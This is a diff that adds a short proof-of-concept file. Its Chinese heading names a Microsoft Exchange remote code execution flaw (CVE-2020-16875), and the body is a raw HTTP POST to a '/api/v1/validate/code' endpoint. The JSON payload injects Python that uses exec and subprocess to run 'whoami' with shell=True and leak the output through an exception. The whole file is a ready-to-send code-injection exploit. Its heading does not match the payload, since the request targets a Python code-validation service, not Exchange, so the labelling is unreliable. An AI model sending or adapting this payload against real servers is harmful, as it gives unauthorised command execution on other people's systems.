@@ -1,0 +1,10 @@
+# Microsoft Exchange 远程代码执行漏洞(CVE-2020-16875)
+POST /api/v1/validate/code HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
+Content-Length: 126
+Content-Type: application/json
+Accept-Encoding: gzip, deflate, br
+
+{"code":"def exploit(cmd=exec('raise Exception(__import__(\"subprocess\").check_output(\"whoami\",shell=True))')):\n\n  pass"}
+
